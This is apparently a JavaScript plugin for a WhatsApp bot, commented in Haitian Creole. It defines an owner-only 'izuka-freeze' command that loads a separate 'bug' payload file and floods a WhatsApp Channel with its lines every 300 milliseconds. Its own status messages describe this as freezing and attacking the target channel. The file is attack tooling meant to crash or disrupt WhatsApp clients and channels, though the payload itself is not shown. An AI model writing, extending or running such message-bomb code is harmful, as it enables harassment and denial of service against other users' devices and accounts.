const bugChannel = require('../../bug/izuka7.js'); // Payload espesyal pou Channel
const config = require('../../config');
const { cmd } = require('../command');

cmd({
  pattern: 'izuka-freeze',
  desc: 'Bug yon WhatsApp Channel',
  category: 'bug',
  filename: __filename
}, async (m, Matrix) => {
  const prefix = config.PREFIX;
  const cmdName = m.body.startsWith(prefix)
    ? m.body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
    : '';

  if (cmdName !== 'izuka-freeze') return;

  const botNumber = await Matrix.decodeJid(Matrix.user.id);
  const senderId = m.sender;
  const isSudo = [
    botNumber,
    config.OWNER_NUMBER + '@s.whatsapp.net',
    ...(config.SUDO || []).map(n => n + '@s.whatsapp.net'),
  ].includes(senderId);

  if (!isSudo) {
    return await Matrix.sendMessage(m.from, {
      text: '*❌ Ou pa otorize pou itilize sa.*',
    }, { quoted: m });
  }

  // Verifye si se nan Channel
  if (!m.from.startsWith('broadcast-')) {
    return await Matrix.sendMessage(m.from, {
      text: '*❌ Sèvi ak kòmand sa sèlman nan yon WhatsApp Channel.*',
    }, { quoted: m });
  }

  const lines = bugChannel.split('\n').filter(Boolean);

  await Matrix.sendMessage(m.from, {
    text: `🧊 *IZUKA-FREEZE LANSE*\n🎯 Objektif: *WhatsApp Channel*\n📨 Voye ${lines.length} mesaj...`,
  }, { quoted: m });

  for (let i = 0; i < lines.length; i++) {
    try {
      await Matrix.sendMessage(m.from, {
        text: `🧨 *FREEZE ${i + 1}*\n${lines[i]}\n\n_BY IZUKA SYSTEM_`,
      });
      await new Promise(r => setTimeout(r, 300));
    } catch (e) {
      console.log(`❌ Mesaj ${i + 1} echwe:`, e.message);
    }
  }

  await Matrix.sendMessage(m.from, {
    text: `✅ *IZUKA-FREEZE FINI*\n❄️ Channel sible atake.`,
  }, { quoted: m });
});
